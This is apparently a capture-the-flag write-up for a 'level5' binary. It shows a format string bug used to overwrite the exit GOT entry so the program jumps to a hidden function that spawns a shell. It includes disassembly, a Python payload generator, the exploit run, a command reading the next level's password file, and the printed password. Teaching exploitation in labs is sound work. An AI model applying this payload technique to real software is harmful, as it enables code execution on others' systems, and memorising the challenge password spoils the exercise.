# Level 5 Walkthrough

## Code Review
`n()` is the only function invoked by `main`:
```asm
0x080484c2 <n>:
  sub   esp, 0x218
  call  fgets(buf, 0x200, stdin)
  call  printf(buf)          ; format string
  mov   dword ptr [esp], 1
  call  exit@plt
```
There is also an unused helper `o()`:
```asm
0x080484a4 <o>:
  system("/bin/sh");
  _exit(1);
```
The idea is to hijack `exit@GOT` so that when `n()` calls `exit`, it jumps into `o()` instead.

## GOT / PLT Primer
`exit@plt` performs:
```
jmp DWORD PTR ds:0x8049838
```
Therefore, overwriting `0x8049838` changes the function pointer. `o()` resides at `0x080484a4`.

## Stack Mapping
Probe the argument order:
```bash
$ python3 -c 'print("AAAA " + "%X " * 50)' | ./level5
AAAA 200 F08E4620 340 41414141 ...
```
The fourth formatted argument prints our `0x41414141`, so `%4$n` will dereference the address stored at the beginning of our input.

## Payload Construction
1. Prefix payload with `p32(0x8049838)` (address of `exit@GOT`).
2. Print enough characters to reach the desired value `0x080484a4` (decimal `134513828`). Since four bytes have already been written, use `%134513824d`.
3. Finish with `%4$n` to perform the write.

Example generator:
```python
import struct
addr = struct.pack("<I", 0x8049838)
value = 0x080484a4
payload = addr + ("%" + str(value - 4) + "d%4$n").encode()
print(payload.decode("latin1"), end="")
```

## Exploitation
```bash
$ (python3 exploit.py) | ./level5
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
After the overwrite, the call to `exit` immediately jumps to `o()`, which executes `/bin/sh`.

## Key Takeaways
- No RELRO means GOT entries are writable—ideal for format string exploitation.
- Always check for hidden helper functions; they often contain `system("/bin/sh")`.

